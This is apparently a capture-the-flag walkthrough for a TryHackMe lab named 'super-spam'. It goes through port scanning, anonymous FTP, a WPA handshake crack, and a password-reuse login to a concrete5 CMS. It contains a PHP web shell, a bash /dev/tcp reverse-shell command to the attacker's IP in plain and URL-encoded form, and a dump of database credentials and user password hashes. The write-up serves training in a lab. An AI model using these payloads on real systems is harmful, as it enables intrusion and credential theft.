ping 64bytes indicates [[linux]]

**[[nmap]]**  all the ports, verbose to see output, and agressive scan reveal
- 80/tcp open  [[http]]
- 4012/tcp open  pda-gate
- 4019/tcp open  talarian-mcast5
- 5901/tcp open  vnc-1
- 6001/tcp open  X11:1
```bash
──(kali㉿kali)-[~/thm/super-spam]
└─$ nmap -p- -v -T4 10.10.97.241            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 04:31 EST
Initiating Ping Scan at 04:31
Scanning 10.10.97.241 [2 ports]
Completed Ping Scan at 04:31, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:31
Completed Parallel DNS resolution of 1 host. at 04:31, 0.01s elapsed
Initiating Connect Scan at 04:31
Scanning 10.10.97.241 [65535 ports]
Discovered open port 80/tcp on 10.10.97.241
Increasing send delay for 10.10.97.241 from 0 to 5 due to max_successful_tryno increase to 5
Connect Scan Timing: About 4.87% done; ETC: 04:42 (0:10:05 remaining)
Connect Scan Timing: About 11.48% done; ETC: 04:40 (0:07:50 remaining)
Connect Scan Timing: About 17.50% done; ETC: 04:40 (0:07:09 remaining)
Discovered open port 5901/tcp on 10.10.97.241
Connect Scan Timing: About 23.40% done; ETC: 04:40 (0:06:36 remaining)
Connect Scan Timing: About 29.35% done; ETC: 04:40 (0:06:03 remaining)
Connect Scan Timing: About 36.51% done; ETC: 04:40 (0:05:36 remaining)
Connect Scan Timing: About 42.34% done; ETC: 04:40 (0:05:04 remaining)
Connect Scan Timing: About 48.38% done; ETC: 04:40 (0:04:30 remaining)
Discovered open port 4019/tcp on 10.10.97.241
Connect Scan Timing: About 54.01% done; ETC: 04:40 (0:04:01 remaining)
Connect Scan Timing: About 59.59% done; ETC: 04:40 (0:03:34 remaining)
Connect Scan Timing: About 65.51% done; ETC: 04:40 (0:03:05 remaining)
Connect Scan Timing: About 71.56% done; ETC: 04:40 (0:02:32 remaining)
Connect Scan Timing: About 77.28% done; ETC: 04:40 (0:02:02 remaining)
Discovered open port 4012/tcp on 10.10.97.241
Connect Scan Timing: About 83.94% done; ETC: 04:40 (0:01:25 remaining)
Connect Scan Timing: About 89.56% done; ETC: 04:40 (0:00:55 remaining)
Discovered open port 6001/tcp on 10.10.97.241
Completed Connect Scan at 04:40, 539.46s elapsed (65535 total ports)
Nmap scan report for 10.10.97.241
Host is up (0.10s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
4012/tcp open  pda-gate
4019/tcp open  talarian-mcast5
5901/tcp open  vnc-1
6001/tcp open  X11:1

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 539.67 seconds
```

**nmap** just the open ports reveals
80 apache
4012 ssh
4019 ftp - 
5901 vnc
6001 x11
```bash
┌──(kali㉿kali)-[~/thm/super-spam]
└─$ nmap -p 80,4012,4019,5901,6001 -sV 10.10.8.207                    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 06:39 EST
Nmap scan report for 10.10.8.207
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
4012/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
4019/tcp open  ftp     vsftpd 3.0.3
5901/tcp open  vnc     VNC (protocol 3.8)
6001/tcp open  X11     (access denied)
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
```

**ftp** annonymous login reveals
- 2 txt notes
- multiple pcap files 
- wi-fi packet capture
```bash
┌──(kali㉿kali)-[~/thm/super-spam]
└─$ ftp 10.10.97.241 -P 4019
Connected to 10.10.97.241.
220 (vsFTPd 3.0.3)
Name (10.10.97.241:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -aslp
229 Entering Extended Passive Mode (|||49691|)
150 Here comes the directory listing.
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .cap
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
226 Directory send OK.
ftp> cd .cap
250 Directory successfully changed.
ftp> ls -aslp
229 Entering Extended Passive Mode (|||47793|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp           249 Feb 20  2021 .quicknote.txt
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> cd IDS_logs
250 Directory successfully changed.
ftp> ls -alsp
229 Entering Extended Passive Mode (|||48220|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp         14132 Feb 20  2021 12-01-21.req.pcapng
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed010.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed013.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01h3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.t
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed6.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed806.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed810.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed816.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed86.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammeda1ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammedabha.s
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 13-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245a.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed24ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed28v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2a5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2bha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2w5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2we8.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wev.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv8.s
-rw-r--r--    1 ftp      ftp         11004 Feb 20  2021 14-01-21.pcapng
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 16-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.a
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed52n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed00050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed100.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10056.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed11.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed130.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed190.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19046.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed1906.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed2.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed200.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed205.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed23.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed280.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed285.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed4.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed410.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed430.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed480.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed490.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed7.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed72.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed75.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed80.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed81.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed82.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed9.s
226 Directory send OK.
```

**aircrack-ng** reveals password 'sandiago'
```bash
┌──(kali㉿kali)-[~/thm/super-spam]
└─$ aircrack-ng -w /opt/rockyou.txt SamsNetwork.cap 
Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.

   #  BSSID              ESSID                     Encryption

   1  D2:F8:8C:31:9F:17  Motocplus                 WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.

1 potential targets


                               Aircrack-ng 1.7 

      [00:03:46] 762753/14344391 keys tested (3418.93 k/s) 

      Time left: 1 hour, 6 minutes, 12 seconds                   5.32%

                           KEY FOUND! [ sandiago ]


      Master Key     : 93 5E 0C 77 A3 B7 17 62 0D 1E 31 22 51 C0 42 92 
                       6E CF 91 EE 54 6B E1 E3 A8 6F 81 FF AA B6 64 E1 

      Transient Key  : 70 72 6D 26 15 45 F9 82 D4 AE A9 29 B9 E7 57 42 
                       7A 40 B4 D1 C3 27 EE 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 1E FB DC A0 1D 48 49 61 3B 9A D7 61 66 71 89 B0
```

**ip/concrete5/index.php/blog reveals users**
Benjamin_Blogger
Lucy_Loser
Donald_Dump
Adam_Admin

**CMS** concrete5 appears to be the cms
- has a login page
- appears Donald_Dump reused the cracked wi-fi password, sandiago, as their login 
https://documentation.concretecms.org/tutorials/how-find-login-url-your-concrete5-website
![[Pasted image 20230202111844.png]]

Logging in produces a 'Read timed out'
- but dashboard shows in url
- removing welcome takes us to the dashboard
![[Pasted image 20230202112319.png]]
- dashboard
![[Pasted image 20230202113708.png]]
right side
Files
- can upload files but .php is not allowed
System and Settings
- Files
	- allowed file types
	- add php and save 

**Testing RCE** Remote Code Execution
- Files
	- File Manager
		- Upload Files
![[Pasted image 20230202114148.png]]

**Creating** RCE POC
- VIM then CAT
```bash
┌──(kali㉿kali)-[~/thm/super-spam]
└─$ cat super-spam.php
<?php
echo "Your mom";
system($_REQUEST['cmd']);
?>
```
- Upload via File Manager on website
- click link to file location on website
- in address bar after .php add ?cmd=id 
	- should see the below
![[Pasted image 20230202124857.png]]
change id to
- bash -c 'exec bash -i &>/dev/tcp/10.6.9.143/4444 <&1'
	- but encode for url below - I used burp 1st
- bash+-c+%27exec+bash+-i+%26%3E/dev/tcp/10.6.9.143/4444+%3C%261%27
- reverse shell should be active 
- stabilize shell

In reverse shell 
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
Then Ctrl-Z

In attacking box - take note of the rows and columns
then fg
```bash
|─(kali㉿kali)-[~/thm/super-spam]
└─$ stty -a
speed 38400 baud; rows 31; columns 150; line = 0;
|─(kali㉿kali)-[~/thm/super-spam]
└─$ stty raw -echo; fg
```

back on reverse shell
```bash
$ stty rows 31 cols 150
```

### Once access has been gained, where do we look for credentials? 
server, web server reveals
- database credentials  'password' => 'arzwashere023r3z0z0z08973jhkjii££$'
```bash
www-data@super-spam:/var/www/html/concrete5/application/files/5116/7535/7509$ cd /var/www/html
www-data@super-spam:/var/www/html$ ls
concrete5
www-data@super-spam:/var/www/html$ cd concrete5/
www-data@super-spam:/var/www/html/concrete5$ ls
LICENSE.TXT  application  composer.json  composer.lock  concrete  index.php  packages  robots.txt  updates
www-data@super-spam:/var/www/html/concrete5$ ls -aslp
total 312
  4 drwxr-xr-x  6 www-data www-data   4096 Apr  9  2021 ./
  4 drwxr-xr-x  3 www-data www-data   4096 Apr  9  2021 ../
  4 -rw-rw-r--  1 www-data www-data   1085 Oct  2  2019 LICENSE.TXT
  4 drwxrwxr-x 19 www-data www-data   4096 Oct  2  2019 application/
  4 -rw-rw-r--  1 www-data www-data   1913 Oct  2  2019 composer.json
272 -rw-rw-r--  1 www-data www-data 276690 Oct  2  2019 composer.lock
  4 drwxrwxr-x 23 www-data www-data   4096 Oct  2  2019 concrete/
  4 -rw-rw-r--  1 www-data www-data     42 Oct  2  2019 index.php
  4 drwxrwxr-x  2 www-data www-data   4096 Oct  2  2019 packages/
  4 -rw-rw-r--  1 www-data www-data    532 Oct  2  2019 robots.txt
  4 drwxrwxr-x  2 www-data www-data   4096 Oct  2  2019 updates/
www-data@super-spam:/var/www/html/concrete5$ cd applcation
bash: cd: applcation: No such file or directory
www-data@super-spam:/var/www/html/concrete5$  ls
LICENSE.TXT  application  composer.json  composer.lock  concrete  index.php  packages  robots.txt  updates
www-data@super-spam:/var/www/html/concrete5$ cd application/
www-data@super-spam:/var/www/html/concrete5/application$ ls
attributes      blocks     config       elements  index.html  languages  page_templates  src     tools
authentication  bootstrap  controllers  files     jobs        mail       single_pages    themes  views
www-data@super-spam:/var/www/html/concrete5/application$ ls -aslp
total 76
4 drwxrwxr-x 19 www-data www-data 4096 Oct  2  2019 ./
4 drwxr-xr-x  6 www-data www-data 4096 Apr  9  2021 ../
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 attributes/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 authentication/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 blocks/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 bootstrap/
4 drwxrwxr-x  4 www-data www-data 4096 Apr  9  2021 config/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 controllers/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 elements/
4 drwxrwxr-x 24 www-data www-data 4096 Feb  2 17:05 files/
0 -rw-rw-r--  1 www-data www-data    0 Oct  2  2019 index.html
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 jobs/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 languages/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 mail/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 page_templates/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 single_pages/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 src/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 themes/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 tools/
4 drwxrwxr-x  2 www-data www-data 4096 Oct  2  2019 views/
www-data@super-spam:/var/www/html/concrete5/application$ cd config/
www-data@super-spam:/var/www/html/concrete5/application/config$ ls -aslp 
total 24
4 drwxrwxr-x  4 www-data www-data 4096 Apr  9  2021 ./
4 drwxrwxr-x 19 www-data www-data 4096 Oct  2  2019 ../
4 -rw-rw-r--  1 www-data www-data   19 Apr  9  2021 app.php
4 -rw-rw-r--  1 www-data www-data  439 Apr  9  2021 database.php
4 drwxr-xr-x  3 www-data www-data 4096 Apr  9  2021 doctrine/
4 drwxr-xr-x  2 www-data www-data 4096 Feb  2 16:40 generated_overrides/
www-data@super-spam:/var/www/html/concrete5/application/config$ cat database.php 
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'concrete5_db',
            'username' => 'concrete5',
            'password' => 'arzwashere023r3z0z0z08973jhkjii££$',
            'character_set' => 'utf8mb4',
            'collation' => 'utf8mb4_unicode_ci',
        ],
    ],
];
```
accessing DB and info
```bash
mysql> use concrete5_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;                           
+-----------------------------------------------------+
| Tables_in_concrete5_db                              |
+-----------------------------------------------------+
| AreaLayoutColumns                                   |
| AreaLayoutCustomColumns                             |
| AreaLayoutPresets                                   |
| AreaLayoutThemeGridColumns                          |
| AreaLayouts                                         |
...
| Users                                               |
| WorkflowProgress                                    |
| WorkflowProgressCategories                          |

mysql> select * from Users;
+-----+------------------+------------------------+--------------------------------------------------------------+-----------+---------------+--------------+---------------------+---------------------+------------+-------------+------------+----------------+------------+-----------------+----------+-----------+------------------+------------------+
| uID | uName            | uEmail                 | uPassword                                                    | uIsActive | uIsFullRecord | uIsValidated | uDateAdded          | uLastPasswordChange | uHasAvatar | uLastOnline | uLastLogin | uPreviousLogin | uNumLogins | uLastAuthTypeID | uLastIP  | uTimezone | uDefaultLanguage | uIsPasswordReset |
+-----+------------------+------------------------+--------------------------------------------------------------+-----------+---------------+--------------+---------------------+---------------------+------------+-------------+------------+----------------+------------+-----------------+----------+-----------+------------------+------------------+
|   1 | Adam_Admin       | adam@super-spam.com    | $2a$12$eLh73vpKLtF4zn49JHg2/Ozvhi5Cm1J6/u3/RYkRDLYEq16bBOIwW |         1 |             1 |            1 | 2021-04-09 10:14:48 | 2021-04-09 13:09:43 |          0 |  1617977909 | 1617977909 |     1617976814 |          4 |               1 | c0a80108 | NULL      | NULL             |                0 |
|   2 | Donald_Dump      | donald@superspam.com   | $2a$12$aAzrxNtJChXaKofR77yz0egzsdPc6VhrOki8PU8yqJ8KxDkRFMj0u |         1 |             1 |            1 | 2021-04-09 13:03:49 | 2021-04-09 13:03:49 |          0 |  1675357450 | 1675354670 |     1624714330 |          7 |               1 | 0a06098f | NULL      | NULL             |                0 |
|   3 | Lucy_Loser       | lucy@superspam.com     | $2a$12$KahgUr/z6ZA0kS30/wuK2.WE8fgxU4bkFJu1Xq5V1afJj2v3ZnUHi |         1 |             1 |            1 | 2021-04-09 13:06:46 | 2021-04-09 13:06:46 |          0 |  1617977765 | 1617977765 |     1617977206 |          2 |               1 | c0a80108 | NULL      | NULL             |                0 |
|   4 | Benjamin_Blogger | benjamin@superspam.com | $2a$12$kt5CWnj5xVShpoQo4AesFeXT.RQFGC.58aSf4Iada24f.RQp4uLEy |         1 |             1 |            1 | 2021-04-09 13:09:01 | 2021-04-09 13:09:01 |          0 |  1617977838 | 1617977838 |              0 |          1 |               1 | c0a80108 | NULL      | NULL             |                0 |
+-----+------------------+------------------------+--------------------------------------------------------------+-----------+---------------+--------------+---------------------+---------------------+------------+-------------+------------+----------------+------------+-----------------+----------+-----------+------------------+------------------+
4 rows in set (0.00 sec)

```